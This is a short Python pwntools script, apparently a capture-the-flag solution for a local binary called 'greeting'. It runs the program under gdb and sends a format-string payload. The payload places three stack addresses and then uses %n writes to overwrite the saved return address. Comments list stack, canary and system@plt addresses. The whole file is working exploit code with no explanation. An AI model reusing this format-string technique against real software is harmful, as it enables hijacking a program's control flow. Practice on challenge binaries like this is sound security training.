from pwn import *

# saved rip is 0xf7c24d43 at 0xffffcffc, 0xffffcfdc
# buffer at 0xffffcfac, 0xffffd01c, 0xffffcf8c
# canary at 0xffffcfec, 0xffffd05c, 0xffffcfcc
# nao is at 0x08048742
# system@plt 0x08048490
# main is at 080485ed

# buffer at 0xffffcf6c
# canary at 0xffffcfac
# saved rip at 0xffffcfbc b"%131x" 

gdbcmds = '''
b *(main+103)
r
'''
#  b"%895x"

target = gdb.debug('./greeting', gdbscript=gdbcmds)

#target = process("./greeting")

payload = p32(0xffffcfbc) + p32(0xffffcfbd) + p32(0xffffcfbe)
payload += b"%207x" + b"%23$n" + b"%920x" + b"%24$n" + b"%25$n"

print(target.recvuntil(b"."))
target.sendline(payload)
target.interactive()
